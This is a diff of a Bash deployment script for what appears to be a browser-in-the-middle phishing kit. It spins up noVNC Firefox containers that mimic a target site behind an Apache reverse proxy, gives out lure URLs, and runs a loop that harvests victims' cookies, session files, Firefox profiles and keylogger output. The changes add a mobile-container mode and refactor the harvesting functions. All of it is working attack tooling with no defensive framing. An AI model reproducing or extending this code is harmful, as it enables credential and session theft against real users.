@@ -29,10 +29,11 @@ helpFunction() {
     echo -e "\t -r true / false to turn on the redirection to the target page"
     echo -e "\t -x true / false to turn on the remote debugging port in all browsers"
     echo -e "\t -l Preferred language codes for the browser (such as en,es,pt,pt-BR)"
+    echo -e "\t -m Enable mobile mode (spawns 2 containers for each user)"
     exit 1 # Exit script after printing help
 }
 
-while getopts "u:d:t:s:c:k:e:a:z:p:r:x:l:" opt
+while getopts "u:d:t:s:c:k:e:a:z:p:r:x:l:m:" opt
 do
     case "$opt" in
         u ) User="$OPTARG" ;;
@@ -48,6 +49,7 @@ do
         r ) Redirect=$OPTARG ;;
         x ) DebugPort=$OPTARG ;;
         l ) AcceptLang=$OPTARG ;;
+        m ) EnableMobile=$OPTARG ;;
         ? ) helpFunction ;; # Print helpFunction in case parameter is non-existent
     esac
 done
@@ -62,6 +64,7 @@ YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m'
 PROFILE_COPY_INTERVAL=5
+APACHEFILE="./proxy/000-default.conf"
 
 # Begin script in case all parameters are correct
 
@@ -122,8 +125,7 @@ clean_docker_images() {
         case $yn in
             [Yy]* )
                 echo -e "${YELLOW}[~] Removing related Docker images...${NC}"
-                images=("vnc-docker" "mvnc-docker" "rev-proxy") # TODO: Remove in favor of 'builds'
-                for img in "${images[@]}"; do
+                for img in "${!builds[@]}"; do
                     img_ids=$(sudo docker images --filter=reference="$img" -q)
                     if [[ -n "$img_ids" ]]; then
                         if sudo docker rmi -f $img_ids; then
@@ -149,57 +151,59 @@ copy_profile() {
     local x=$1
     shift
 
+    local mobile=$2
+    shift
+
     # URLs
     local urls=("$@")
 
     pushd ./output &> /dev/null
-    sudo docker exec vnc-user$x sh -c "find -name recovery.jsonlz4 -exec cp {} /home/headless/ \;"
-    sudo docker exec vnc-user$x sh -c "find -name cookies.sqlite -exec cp {} /home/headless/ \;"
-    sudo docker exec vnc-user$x test -e /home/headless/Keylog.txt && sudo docker cp vnc-user$x:/home/headless/Keylog.txt ./user$x-keylog.txt
-    sudo docker exec "mvnc-user$((x + 1 ))" sh -c "find -name recovery.jsonlz4 -exec cp {} /home/headless/ \;"
-    sudo docker exec "mvnc-user$((x + 1 ))" sh -c "find -name cookies.sqlite -exec cp {} /home/headless/ \;"
-    sudo docker exec "mvnc-user$((x + 1 ))" test -e /home/headless/Keylog.txt && sudo docker cp "mvnc-user$((x + 1 ))":/home/headless/Keylog.txt ./muser$x-keylog.txt
-    sleep 2
-    sudo docker cp vnc-user$x:/home/headless/recovery.jsonlz4 ./user$x-recovery.jsonlz4
-    sudo docker cp vnc-user$x:/home/headless/cookies.sqlite ./user$x-cookies.sqlite
-    sudo docker exec vnc-user$x sh -c "rm -f /home/headless/recovery.jsonlz4"
-    sudo docker exec vnc-user$x sh -c "rm -f /home/headless/cookies.sqlite"
 
-    sudo docker cp "mvnc-user$((x + 1 ))":/home/headless/recovery.jsonlz4 ./muser$x-recovery.jsonlz4
-    sudo docker cp "mvnc-user$((x + 1 ))":/home/headless/cookies.sqlite ./muser$x-cookies.sqlite
-    sudo docker exec "mvnc-user$((x + 1 ))" sh -c "rm -f /home/headless/recovery.jsonlz4"
-    sudo docker exec "mvnc-user$((x + 1 ))" sh -c "rm -f /home/headless/cookies.sqlite"
+    if [ $mobile = "true" ]; then
+        DATA_CONT=mvnc-user$x
+        NAME_USER=muser$x
+        NAME_PROF=mphis$x
+    else
+        DATA_CONT=vnc-user$x
+        NAME_USER=user$x
+        NAME_PROF=phis$x
+    fi
+
+    # Copy browser data into a central folder
+    # and copy keylogger results to host
+    sudo docker exec $DATA_CONT sh -c "find -name recovery.jsonlz4 -exec cp {} /home/headless/ \;"
+    sudo docker exec $DATA_CONT sh -c "find -name cookies.sqlite -exec cp {} /home/headless/ \;"
+    sudo docker exec $DATA_CONT test -e /home/headless/Keylog.txt && sudo docker cp $DATA_CONT:/home/headless/Keylog.txt ./$NAME_USER-keylog.txt
+    #sleep 2
+
+    # Copy browser data from the central folder
+    # to the host
+    sudo docker cp $DATA_CONT:/home/headless/recovery.jsonlz4 ./$NAME_USER-recovery.jsonlz4
+    sudo docker cp $DATA_CONT:/home/headless/cookies.sqlite ./$NAME_USER-cookies.sqlite
+    sudo docker exec $DATA_CONT sh -c "rm -f /home/headless/recovery.jsonlz4"
+    sudo docker exec $DATA_CONT sh -c "rm -f /home/headless/cookies.sqlite"
+
     sleep 2
     if [ -n "$OFormat" ]; then
         FormatArg=simple
     else
         FormatArg=default
 
-        sudo docker exec vnc-user$x sh -c 'cp -rf .mozilla/firefox/$(find -name recovery.jsonlz4 | cut -d "/" -f 4)/ ffprofile'
-        sudo docker cp vnc-user$x:/home/headless/ffprofile ./phis$x-ffprofile
-        sudo docker exec vnc-user$x sh -c "rm -rf /home/headless/ffprofile"
-        sudo chown -R 1000 ./phis$x-ffprofile
-
-        sudo docker exec "mvnc-user$((x + 1 ))" sh -c 'cp -rf .mozilla/firefox/$(find -name recovery.jsonlz4 | cut -d "/" -f 4)/ ffprofile'
-        sudo docker cp "mvnc-user$((x + 1 ))":/home/headless/ffprofile ./mphis$x-ffprofile
-        sudo docker exec "mvnc-user$((x + 1 ))" sh -c "rm -rf /home/headless/ffprofile"
-        sudo chown -R 1000 ./mphis$x-ffprofile
+        sudo docker exec $DATA_CONT sh -c 'cp -rf .mozilla/firefox/$(find -name recovery.jsonlz4 | cut -d "/" -f 4)/ ffprofile'
+        sudo docker cp $DATA_CONT:/home/headless/ffprofile ./$NAME_PROF-ffprofile
+        sudo docker exec $DATA_CONT sh -c "rm -rf /home/headless/ffprofile"
+        sudo chown -R 1000 ./$NAME_PROF-ffprofile
 
         if [ "$rzip" = "true" ]; then
-            zip -r phis$x-ffprofile.zip phis$x-ffprofile/ &> /dev/null
-            rm -r phis$x-ffprofile/
-
-            zip -r mphis$x-ffprofile.zip mphis$x-ffprofile/ &> /dev/null
-            rm -r mphis$x-ffprofile/
+            zip -r $NAME_PROF-ffprofile.zip $NAME_PROF-ffprofile/ &> /dev/null
+            rm -r $NAME_PROF-ffprofile/
         fi
     fi
 
     popd &> /dev/null
 
-    python3 ./scripts/session-collector.py ./user$x-recovery.jsonlz4 $FormatArg
-    python3 ./scripts/cookies-collector.py ./user$x-cookies.sqlite $FormatArg
-    python3 ./scripts/session-collector.py ./muser$x-recovery.jsonlz4 $FormatArg
-    python3 ./scripts/cookies-collector.py ./muser$x-cookies.sqlite $FormatArg
+    python3 ./scripts/session-collector.py ./$NAME_USER-recovery.jsonlz4 $FormatArg
+    python3 ./scripts/cookies-collector.py ./$NAME_USER-cookies.sqlite $FormatArg
 
     pushd ./output &> /dev/null
 
@@ -247,7 +251,12 @@ case "$1" in
     fi
 
     START=1
-    END=$((User * 2))
+
+    if [ "$EnableMobile" = "true" ]; then
+        END=$((User * 2))
+    else
+        END=$User
+    fi
     
     temptitle=$(curl $Target -sL -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' | grep -oP '(?<=title).*(?<=title>)' | grep -oP '(?=>).*(?=<)') 
     pagetitle="${temptitle:1}"
@@ -256,47 +265,45 @@ case "$1" in
     curl https://www.google.com/s2/favicons?domain=$Target -sL --output novnc.ico
     icopath="./novnc.ico"
     
+    if [ -n "$SSL" ]; then
+        schema=https
+        proxyport=443
+    else
+        schema=http
+        proxyport=80
+    fi
+
     echo -e "${YELLOW}[~] Generating configuration file${NC}" 
+
     echo 'NameVirtualHost *
              Header unset ETag
              Header set Cache-Control "max-age=0, no-cache, no-store, must-revalidate"
              Header set Pragma "no-cache"
              Header set Expires "Wed, 12 Jan 1980 05:00:00 GMT"
-         ' > ./proxy/000-default.conf
+         ' > $APACHEFILE
     
-    if [ -n "$SSL" ]
-    then
-        echo "<VirtualHost *:443>" >> ./proxy/000-default.conf
+    echo "<VirtualHost *:$proxyport>" >> $APACHEFILE
+
+    # Set up SSL cert / key
+    if [ -n "$SSL" ]; then
         echo "
         SSLEngine on
-          SSLProxyEngine on
-           SSLCertificateFile /etc/ssl/certs/server.pem
-           SSLCertificateKeyFile /etc/ssl/private/server.key
-        " >> ./proxy/000-default.conf
-        echo '
-        RewriteEngine On
-            RewriteMap redirects txt:/tmp/redirects.txt
-        RewriteCond ${redirects:%{REQUEST_URI}} ^(.+)$
-        RewriteRule ^(.*)$ ${redirects:$1} [R,L]
-            
-            <Location /status.php>
-            Deny from all
-        </Location>
-        ' >> ./proxy/000-default.conf
-    else
-        echo "<VirtualHost *:80>" >> ./proxy/000-default.conf
-        echo '
-        RewriteEngine On
-            RewriteMap redirects txt:/tmp/redirects.txt
-        RewriteCond ${redirects:%{REQUEST_URI}} ^(.+)$
-        RewriteRule ^(.*)$ ${redirects:$1} [R,L]
-        
-        <Location /status.php>
-            Deny from all
-        </Location>
-
-        ' >> ./proxy/000-default.conf
+        SSLProxyEngine on
+        SSLCertificateFile /etc/ssl/certs/server.pem
+        SSLCertificateKeyFile /etc/ssl/private/server.key
+        " >> $APACHEFILE
     fi
+
+    echo '
+    RewriteEngine On
+    RewriteMap redirects txt:/tmp/redirects.txt
+    RewriteCond ${redirects:%{REQUEST_URI}} ^(.+)$
+    RewriteRule ^(.*)$ ${redirects:$1} [R,L]
+    
+    <Location /status.php>
+        Deny from all
+    </Location>
+    ' >> $APACHEFILE
      
     echo -e "${GREEN}[+] Configuration file generated${NC}" 
     
@@ -343,9 +350,11 @@ case "$1" in
         if [ "$mobile" = "true" ]; then
             VNC_IMG=mvnc-docker;
             VNC_CONT=mvnc-user$c;
+            PREF_FILE='./vnc/muser.js';
         else
             VNC_IMG=vnc-docker;
             VNC_CONT=vnc-user$c;
+            PREF_FILE='./vnc/user.js';
         fi
 
         echo -e "${BLUE}———— ${VNC_CONT} (from image ${VNC_IMG}) [$c/$END] ————${NC}";
@@ -356,6 +365,7 @@ case "$1" in
 
         # Start up the corresponding VNC container
         # and then firefox a single time (just to set up the profile?)
+        echo -e "${YELLOW}[+] Starting VNC container${NC}"
         if [ "$DebugPort" = "true" ]; then
             DEBUGPORT_HOST=9$(printf "%03d" $c)
             sudo docker run -dit -p $DEBUGPORT_HOST:9223 --name $VNC_CONT -e VNC_PW=$PW -e NOVNC_HEARTBEAT=30 $VNC_IMG  &> /dev/null 
@@ -367,22 +377,23 @@ case "$1" in
         else
             sudo docker run -dit --name $VNC_CONT -e VNC_PW=$PW -e NOVNC_HEARTBEAT=30 $VNC_IMG  &> /dev/null 
         fi
+        echo -e "${GREEN}[+] VNC container started${NC}"
+
+        echo -e "${YELLOW}[+] Setting up firefox profile...${NC}"
+
         sleep 3
         sudo docker exec $VNC_CONT sh -c "firefox &" &> /dev/null
         sleep 1
         sudo docker exec $VNC_CONT sh -c "pidof firefox | xargs kill &" &> /dev/null
         sleep 2
 
-        if [ "$mobile" = "true" ]; then
-            sudo docker cp ./vnc/muser.js $VNC_CONT:/home/headless/user.js
-        else
-            sudo docker cp ./vnc/user.js $VNC_CONT:/home/headless/user.js
-        fi
+        sudo docker cp $PREF_FILE $VNC_CONT:/home/headless/user.js
 
         #sleep 1;
 
         sudo docker exec $VNC_CONT sh -c "find -name cookies.sqlite -exec dirname {} \; | xargs -I {} cp -f -r /home/headless/user.js {}"
 
+        echo -e "${GREEN}[+] Profile setup completed.${NC}"
 
         sleep 1
         
@@ -399,33 +410,12 @@ case "$1" in
         fi
 
         # Replace TARGET_URL placeholder with actual target inside vnc/ui.js
-        if [ -n "$Redirect" ]
-        then
+        if [ -n "$Redirect" ]; then
             RedirectTarget=$Target
-            if [ "$mobile" = "true" ]
-            then
-                sudo docker exec --user root mvnc-user$c sh -c "sed -i 's/TARGET_URL/${Target//\//\\/}/g' /usr/libexec/noVNCdim/app/ui.js"
-            else
-                sudo docker exec --user root vnc-user$c sh -c "sed -i 's/TARGET_URL/${Target//\//\\/}/g' /usr/libexec/noVNCdim/app/ui.js"
-            fi
+            sudo docker exec --user root $VNC_CONT sh -c "sed -i 's/TARGET_URL/${Target//\//\\/}/g' /usr/libexec/noVNCdim/app/ui.js"
         else
             RedirectTarget="/"
-            if [ -n "$SSL" ]
-            then
-                if [ "$mobile" = "true" ]
-                then
-                    sudo docker exec --user root mvnc-user$c sh -c "sed -i 's/TARGET_URL/https:\/\/$Domain/g' /usr/libexec/noVNCdim/app/ui.js"
-                else
-                    sudo docker exec --user root vnc-user$c sh -c "sed -i 's/TARGET_URL/https:\/\/$Domain/g' /usr/libexec/noVNCdim/app/ui.js"
-                fi
-            else
-                if [ "$mobile" = "true" ]
-                then
-                    sudo docker exec --user root mvnc-user$c sh -c "sed -i 's/TARGET_URL/http:\/\/$Domain/g' /usr/libexec/noVNCdim/app/ui.js"
-                else
-                    sudo docker exec --user root vnc-user$c sh -c "sed -i 's/TARGET_URL/http:\/\/$Domain/g' /usr/libexec/noVNCdim/app/ui.js"
-                fi
-            fi
+            sudo docker exec --user root $VNC_CONT sh -c "sed -i 's/TARGET_URL/'$schema':\/\/$Domain/g' /usr/libexec/noVNCdim/app/ui.js"
         fi
         
         # Important sleep!
@@ -453,126 +443,49 @@ case "$1" in
         echo -e "${GREEN}[+] Browser started${NC}"
 
         CIP=$(sudo docker container inspect $VNC_CONT | grep -m 1 -oP '"IPAddress":\s*"\K[^"]+')
-                
+
         if [ "$mobile" = "true" ]; then
             filename="miframe$((c - 1)).html"
         else
             filename="iframe$c.html"
         fi
         
-        if [ -n "$SSL" ]
-        then
-        echo "
-        <!DOCTYPE html>
-        <html lang='en'>
-        <head>
-            <meta charset='UTF-8'>
-            <meta name='viewport' content='width=device-width, initial-scale=1.0'>
-            <link rel='icon' href='https://$Domain/favicon.ico' type='image/x-icon'>
-            
-            <title>$pagetitle</title>
-            
-            <style>
-            body, html {
-                height: 100%;
-                margin: 0;
-                overflow: hidden;
-            }
-            iframe {
-                width: 100%;
-                height: 100%;
-                border: none;
-            }
-            </style>
-            <script>
-            function resizeIframe() {
-                var iframe = document.getElementById('myIframe');
-                iframe.style.height = window.innerHeight + 'px';
-                iframe.style.width = window.innerWidth + 'px';
-            }
+        awk '{
+            gsub("%schema%", "'$schema'");
+            gsub("%PW%", "'$PW'");
+            gsub("%domain%", "'$Domain'");
+            gsub("%pagetitle%", "'$pagetitle'");
+            print
+        }' templates/proxy.html > ./proxy/$filename
 
-            window.onload = function () {
-                resizeIframe(); // Resize on initial load
-                window.addEventListener('resize', resizeIframe); // Resize on window resize
-            };
-            </script>
-        </head>
-        <body>
-            <iframe id='myIframe' src='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote' frameborder='0'></iframe>
-        </body>
-        </html>
-        " > ./proxy/$filename
-        else
+        if [ "$mobile" = "false" ]; then
         echo "
-        <!DOCTYPE html>
-        <html lang='en'>
-        <head>
-            <meta charset='UTF-8'>
-            <meta name='viewport' content='width=device-width, initial-scale=1.0'>
-            <link rel='icon' href='http://$Domain/favicon.ico' type='image/x-icon'>
-            <title>$pagetitle</title>
-            <style>
-            body, html {
-                height: 100%;
-                margin: 0;
-                overflow: hidden;
-            }
-            iframe {
-                width: 100%;
-                height: 100%;
-                border: none;
-            }
-            </style>
-            <script>
-            function resizeIframe() {
-                var iframe = document.getElementById('myIframe');
-                iframe.style.height = window.innerHeight + 'px';
-                iframe.style.width = window.innerWidth + 'px';
-            }
+    RewriteCond %{REQUEST_URI} /v$c
+    RewriteCond %{HTTP_USER_AGENT} \"iPhone|Android|iPad\"
+    RewriteRule ^/(.*) /miframe$c.html [P,L]
+            
+    RewriteCond %{REQUEST_URI} /v$c
+    RewriteCond %{HTTP_USER_AGENT} !(iPhone|Android|iPad)
+    RewriteRule ^/(.*) /iframe$c.html [P]
+        " >> $APACHEFILE
+        fi
 
-            window.onload = function () {
-                resizeIframe(); // Resize on initial load
-                window.addEventListener('resize', resizeIframe); // Resize on window resize
-            };
-            </script>
-        </head>
-        <body>
-            <iframe id='myIframe' src='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote' frameborder='0'></iframe>
-        </body>
-        </html>
-        " > ./proxy/$filename
-        fi
-        
-        if [ "$mobile" = "false" ]
-        then
-        echo "
-            RewriteCond %{REQUEST_URI} /v$c
-            RewriteCond %{HTTP_USER_AGENT} \"iPhone|Android|iPad\"
-            RewriteRule ^/(.*) /miframe$c.html [P,L]
-            
-            RewriteCond %{REQUEST_URI} /v$c
-            RewriteCond %{HTTP_USER_AGENT} !(iPhone|Android|iPad)
-            RewriteRule ^/(.*) /iframe$c.html [P]
-        " >> ./proxy/000-default.conf
-        fi
-        
         echo "
             
-        <Location /$PW>
+    <Location /$PW>
         ProxyPass http://$CIP:6901
         ProxyPassReverse http://$CIP:6901
-        </Location>
-        <Location /$PW/websockify>
+    </Location>
+    <Location /$PW/websockify>
         ProxyPass ws://$CIP:6901/websockify keepalive=On
         ProxyPassReverse ws://$CIP:6901/websockify
-        </Location>
-        ProxyTimeout 600
-        Timeout 600
-    " >> ./proxy/000-default.conf
+    </Location>
+    ProxyTimeout 600
+    Timeout 600
+    " >> $APACHEFILE
         
-        if [ -n "$SSL" ]
-        then
-        echo "
+        if [ -n "$SSL" ]; then
+            echo "
             <div class='iframe-wrapper'>
               <iframe class='custom-iframe' src='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' sandbox='allow-same-origin allow-scripts'></iframe>
               <!-- Form for file creation -->
@@ -587,19 +500,9 @@ case "$1" in
               <a class='iframe-button' href='https://$Domain:65534/angler/$PW/conn.html?path=/angler/$PW/websockify&password=$PW&autoconnect=true&resize=remote' target='_blank'>Connect</a>
             </div>
               </form>
-            </div>            
-        " >> ./output/status.php
-        if [ "$mobile" = "false" ]
-        then
-            if [ -n "$param" ]
-            then
-            urls+=("http://$Domain/v$c/$param")
-            else
-            urls+=("http://$Domain/v$c/oauth2/authorize?access-token=$Token")
-            fi
-        fi
+            </div>" >> ./output/status.php
         else
-        echo "
+            echo "
             <div class='iframe-wrapper'>
               <iframe class='custom-iframe' src='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' sandbox='allow-same-origin allow-scripts'></iframe>
               <!-- Form for file creation -->
@@ -614,46 +517,39 @@ case "$1" in
               <a class='iframe-button' href='http://$Domain:65534/angler/$PW/conn.html?path=/angler/$PW/websockify&password=$PW&autoconnect=true&resize=remote' target='_blank'>Connect</a>
             </div>
               </form>
-            </div>
-        " >> ./output/status.php
-        if [ "$mobile" = "false" ]
-        then
-            if [ -n "$param" ]
-            then
-            urls+=("http://$Domain/v$c/$param")
+            </div>" >> ./output/status.php
+        fi
+
+        if [ "$mobile" = "false" ]; then
+            if [ -n "$param" ]; then
+                urls+=("$schema://$Domain/v$c/$param")
             else
-            urls+=("http://$Domain/v$c/oauth2/authorize?access-token=$Token")
+                urls+=("$schema://$Domain/v$c/oauth2/authorize?access-token=$Token")
             fi
         fi
+    
+        if [ "$EnableMobile" = "true" ]; then
+            # Only toggle mobile flag between iterations if
+            # EnableMobile is set to true
+            if [ "$mobile" = "true" ]; then
+                mobile=false
+            else
+                mobile=true
+            fi 
         fi
-    
-    if [ "$mobile" = "true" ]
-    then
-        mobile=false
-    else
-        mobile=true
-    fi 
-    
     done
+
     echo "
         </div>
     </body>
     </html>
         " >> ./output/status.php
-    echo "</VirtualHost>" >> ./proxy/000-default.conf
+    echo "</VirtualHost>" >> $APACHEFILE
 
-        
-    if [ -n "$SSL" ]; then
-        apachefile="./proxy/000-default.conf"
-        awk '/<VirtualHost/,/<\/VirtualHost/ {gsub(":443", ":65534");gsub("Location /","Location /angler/");print; if (/<\/VirtualHost/) print ""}' "$apachefile" > temp.txt
-        awk '/<VirtualHost/,/<\/VirtualHost/ {gsub("Location /angler/status.php","Location /");gsub("Deny from all","AuthType Basic \n                    AuthName \"Restricted Area\" \n                    AuthUserFile /etc/apache2/.htpasswd \n                    Require valid-user");print; if (/<\/VirtualHost/) print ""}' "temp.txt" > temp2.txt
-    else
-        apachefile="./proxy/000-default.conf"
-        awk '/<VirtualHost/,/<\/VirtualHost/ {gsub(":80", ":65534");gsub("Location /","Location /angler/");print; if (/<\/VirtualHost/) print ""}' "$apachefile" > temp.txt
-        awk '/<VirtualHost/,/<\/VirtualHost/ {gsub("Location /angler/status.php","Location /");gsub("Deny from all","AuthType Basic \n                    AuthName \"Restricted Area\" \n                    AuthUserFile /etc/apache2/.htpasswd \n                    Require valid-user");print; if (/<\/VirtualHost/) print ""}' "temp.txt" > temp2.txt
-    fi
+    awk '/<VirtualHost/,/<\/VirtualHost/ {gsub(":'$proxyport'", ":65534");gsub("Location /","Location /angler/");print; if (/<\/VirtualHost/) print ""}' "$APACHEFILE" > temp.txt
+    awk '/<VirtualHost/,/<\/VirtualHost/ {gsub("Location /angler/status.php","Location /");gsub("Deny from all","AuthType Basic \n        AuthName \"Restricted Area\" \n        AuthUserFile /etc/apache2/.htpasswd \n        Require valid-user");print; if (/<\/VirtualHost/) print ""}' "temp.txt" > temp2.txt
    
-    cat temp2.txt >> ./proxy/000-default.conf
+    cat temp2.txt >> $APACHEFILE
     
     rm -f ./temp.txt ./temp2.txt
 
@@ -662,11 +558,7 @@ case "$1" in
     echo -e "${YELLOW}[~] Starting reverse proxy${NC}"  
 
     # Start of rev proxy
-    if [ -n "$SSL" ]; then
-        sudo docker run -dit -p443:443 -p65534:65534 --name rev-proxy rev-proxy /bin/bash &> /dev/null
-    else
-        sudo docker run -dit -p80:80 -p65534:65534 --name rev-proxy rev-proxy /bin/bash &> /dev/null
-    fi
+    sudo docker run -dit -p$proxyport:$proxyport -p65534:65534 --name rev-proxy rev-proxy /bin/bash &> /dev/null
     
     sleep 5
 
@@ -677,12 +569,13 @@ case "$1" in
     
     sudo docker exec rev-proxy /bin/bash -c 'echo "Listen 65534" >> /etc/apache2/ports.conf' 
     sudo docker exec -it rev-proxy /bin/bash -c "htpasswd -cb /etc/apache2/.htpasswd angler $AdminPW"
-    sudo docker cp ./proxy/000-default.conf rev-proxy:/etc/apache2/sites-enabled/   &> /dev/null
+    sudo docker cp $APACHEFILE rev-proxy:/etc/apache2/sites-enabled/   &> /dev/null
     sudo docker cp ./novnc.ico rev-proxy:/var/www/html/favicon.ico
-    END=$((END / 2))
-    for (( d=$START; d<=$END; d++ )); do
+    for (( d=$START; d<=$User; d++ )); do
         sudo docker cp ./proxy/iframe$d.html rev-proxy:/var/www/html/
-        sudo docker cp ./proxy/miframe$d.html rev-proxy:/var/www/html/
+        if [ "$EnableMobile" = "true" ]; then
+            sudo docker cp ./proxy/miframe$d.html rev-proxy:/var/www/html/
+        fi
     done
     sudo docker exec rev-proxy sed -i 's/MaxKeepAliveRequests 100/MaxKeepAliveRequests 0/' '/etc/apache2/apache2.conf'
     
@@ -698,9 +591,9 @@ case "$1" in
 
     echo -n "[+] Admin interface available under: "
     if [ -n "$SSL" ]; then
-        echo -e "https://$Domain:65534/status.php"
+        echo -e "${BLUE}https://$Domain:65534/status.php${NC}"
     else
-        echo -e "http://$Domain:65534/status.php"
+        echo -e "${BLUE}http://$Domain:65534/status.php${NC}"
     fi
         
     echo -e "    +----------------------------------------------+"
@@ -710,12 +603,13 @@ case "$1" in
     echo -e "${GREEN}[+] Setup completed${NC}"
     echo -e "[+] Use the following URLs:"
     for value in "${urls[@]}"; do
-        echo -e "    $value"
+        echo -e "    ${BLUE}$value${NC}"
     done
     
     dbpath="./output/phis.db"
     if [ -e $dbpath ]; then
         rm -f $dbpath
+        echo -e "${GREEN}[+] Cleared existing ./output/phis.db...${NC}"
     fi
     
     echo -e "[~] Starting Loop to collect sessions and cookies from containers${NC}" 
@@ -729,9 +623,18 @@ case "$1" in
     sleep $PROFILE_COPY_INTERVAL
 
     > logs/copy_profile.log
+
     while :; do
+        mobile=false
         for (( c=$START; c<=$END; c++ )); do
-            copy_profile $c $urls >> logs/copy_profile.log 2>&1
+            copy_profile $c $mobile $urls >> logs/copy_profile.log 2>&1
+            if [ "$EnableMobile" = "true" ]; then
+                if [ "$mobile" = "true" ]; then
+                    mobile="false"
+                else
+                    mobile="true"
+                fi
+            fi
         done
 
         sleep $PROFILE_COPY_INTERVAL
